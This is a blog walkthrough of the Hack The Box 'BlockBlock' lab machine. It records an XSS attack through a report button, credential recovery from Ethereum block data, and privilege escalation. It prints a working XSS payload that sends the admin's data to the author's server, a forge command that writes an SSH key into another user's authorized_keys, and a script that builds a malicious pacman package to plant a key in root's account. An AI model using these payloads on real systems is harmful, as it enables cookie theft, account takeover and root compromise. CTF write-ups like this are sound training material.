---
title: "BlockBlock Walkthrough(Hack The Box)"
date: 2025-03-29
draft: true
description: "Awesome Walkthrough"
tags: ["Hard", "Linux", "Hack The Box", "hacking", "Web3", "BLock Chain", "Walkthrough"]
---
## Reconnaissance 
- Got two ports open 80 and ssh 
- First impression of the web is, It is a Web3 and a chat app
![Pasted image 20250106030842.png]()
- The page using Ethereum
![Pasted image 20250105224629.png]()
- Interesting isn't it, Created a account and logged in 
- Has a secure and cool place to chat
![Pasted image 20250106000441.png]()
- The chats data are stored using Ethereum in Blocks
- Scooped around a little bit and found `/admin` page but with no access for us
- The "Report User" button seems little suspicious cause the website is well built but not the report button
![Pasted image 20250106000810.png]()

## Enumeration
- Turns out the `Report User` button functionality is vulnerable to XSS
- The stupid admin is clicking around the links. 
- But the weird thing here is, Admin only clicking alert boxes not all links
- So made up a XSS payload with the help of chatGPT 
```js
<img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.text();}).then(dataFromA => {return fetch(`http://10.10.14.12:8000/?d=${dataFromA}`)})">
```
- This payload fetches data from the request to the `/api/info` and returns it to my server
![Pasted image 20250106001445.png]()
- Got the admin cookie and accessed the `/admin` page.
- In the Source of admin page found interesting endpoints
![Pasted image 20250106001604.png]()
- This `json-rpc` endpoint can query more stuff
- This [Documentation](https://ethereum.org/en/developers/docs/apis/json-rpc/) has more info about the stuffs that can be done with this endpoint
- But particularly this one catches my attention
![Pasted image 20250106002345.png]()
- This parameter `eth_blockNumber` gets the recent block that saved have been saved.
- I tested the endpoint `json-rpc` with this `eth_blockNumber`
- Seems the value next to the `params` value is a boolean
![Pasted image 20250106002939.png]()
- The `Params` value is the the value for the block.
- This request data's response seemed interesting
- **Request**
```json
{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x3",true],"id":1}
```
- **Response**
```json
{"id":1,"jsonrpc":"2.0","result":{"baseFeePerGas":"0x2ed9c9d5","blobGasUsed":"0x0","difficulty":"0x0","excessBlobGas":"0x0","extraData":"0x","gasLimit":"0x1c9c380","gasUsed":"0x5208","hash":"0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2","logsBloom":"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","miner":"0x0000000000000000000000000000000000000000","mixHash":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0000000000000000","number":"0x3","parentHash":"0xbb0a3238a043aca148c25eca9495f869c9d77eb4e09aa10d84c7671bf4c3bed1","receiptsRoot":"0x1ee3363046236ead36f002663ef78ab52f67ac34d6f1f88e10d3880f599467fe","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","size":"0x27a","stateRoot":"0xbfe4686238e176ede330654210feb1bb7498d93bb02d29f260f8f196a96a606e","timestamp":"0x677ac8f9","totalDifficulty":"0x0","transactions":[{"accessList":[],"blockHash":"0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2","blockNumber":"0x3","chainId":"0x7a69","from":"0xb795dc8a5674250b602418e7f804cd162f03338b","gas":"0x5209","gasPrice":"0x2ed9c9d5","hash":"0xeebe19598f35ccc154e96861f410a90f6a76ab9aeec456a880e6cb8b571faf62","input":"0x","maxFeePerGas":"0x5db393aa","maxPriorityFeePerGas":"0x0","nonce":"0x2","r":"0xa1573f48dd6f63e72b9ce8c6227179a139d59870f4d16e874e88d4b93cba095c","s":"0x79d8d9216eceefec581ef607b2aa74211ce4bdb66171882834b5ab8d117b53d6","to":"0x6b388912df3e0c179384903efa36daf47738ec91","transactionIndex":"0x0","type":"0x2","v":"0x0","value":"0x2540be400","yParity":"0x0"}],"transactionsRoot":"0x231277c116523613e92267b48237bd95ea4da316b3b07fa1bb3ad86de49caf78","uncles":[]}}
```
- But this response didn't had value for `input`.
- `input` should be the data which is written in the block
## Exploitation
- By Changing the value of `i` here like `1,2 or 3`, we can explore other block's data 
```
"params":["0xi",true]
```
- Likewise got a `input` value
![Pasted image 20250106003937.png]()
- After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it using with the help of Cyberchef and got password and username from it.
![Pasted image 20250106004230.png]()
- So logged in using SSH and got the user flag
![Pasted image 20250106004313.png]()

## Privilege Escalation
- It seems the user keira can run sudo a user paul with a binary
![Pasted image 20250106004658.png]()
- `forge` is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like `Foundry` for Ethereum development or any other CLI-based tool with the name `forge`
- After hours of research found that we can use `flatten` option using forge to write something .
-  When someone login in SSH using private key, SSH checks the authenticity of the key with its public key on the system.
- Here using the `flatten` option in forge, can simply copy the Public key of the user `keira` to home directory of `paul`. After that on passing the private key of the user `keira` we can get ssh shell as `paul` 
- **Step-1**
	- On the system created ssh keys using this command
```
ssh-keygen
```
![Pasted image 20250107181255.png]()
- **Step-2**
	- Copy the public key of user `keira` to the `/tmp` folder and Give all necessary permissions.
```
cp .ssh/id_ed25519.pub /tmp/pub
```

```
chmod 644 /tmp/pub
```
![Pasted image 20250107183317.png]()

- **Step-3**
- Exploit using the `flatten` option to write the public to the user `paul`'s home directory in the `.ssh/authorized_keys` file
```bash
sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
```
![Pasted image 20250107183403.png]()
- **Step-4**
- Now share the private key to the host system and login using the private key as user `paul`
```bash
python3 -m http.server --directory .ssh/
```
![Pasted image 20250107183432.png]()
- Got access as user `paul`
![Pasted image 20250107183526.png]()
- As we can see user `paul` has SUDO privilege to run `pacman`
- To exploit this, create a own malicious package and install it using pacman.
- Initially I was struggling cause of my malicious package not working as intended.
- Then after that I have used a script from my group leader [TheCyberSimon](http://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/)
- Then It worked for me
```bash
#!/bin/bash

# Create a working directory
mkdir priv && cd priv

# Generate PKGBUILD file
cat <<EOF >PKGBUILD
pkgname=privesc
pkgver=1.0
pkgrel=1
pkgdesc="Privilege Escalation Package"
arch=('any')
url="http://example.com"
license=('GPL')
depends=()
makedepends=()
source=('authorized_keys')
sha256sums=('SKIP')
package() {
  install -Dm755 "\$srcdir/authorized_keys" "\$pkgdir/root/.ssh/authorized_keys"
}
EOF

# Generate SSH keys
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
mv id_rsa.pub authorized_keys

# Build the malicious package
makepkg

# Output message
echo "Malicious package created! Run the following command to deploy:"
echo "sudo pacman -U $(pwd)/privesc-1.0-1-any.pkg.tar.zst"
echo "Don't forget to secure your private key: id_rsa
```
- This script is quite simple, the script first makes a directory named `priv` then creates a file named `PKGBUILD` with malicious code.
- The malicious code will replace the `root` user's `authorized_keys` file with our public key
- Script also creates the ssh keys of our system in the current directory with no password and then it renamed the public key name to `authorized_keys`
- It executes this command `makepkg`. Which will compile the malicious  package with our public key `authorized_keys`
![Pasted image 20250107185332.png]()
- Transfer this malicious package to the target system and install it using `sudo`
![Pasted image 20250107185451.png]()
- On the host system give all the necessary permissions to our private key and use it to login
- System rooted successfully.
![Pasted image 20250107185638.png]()
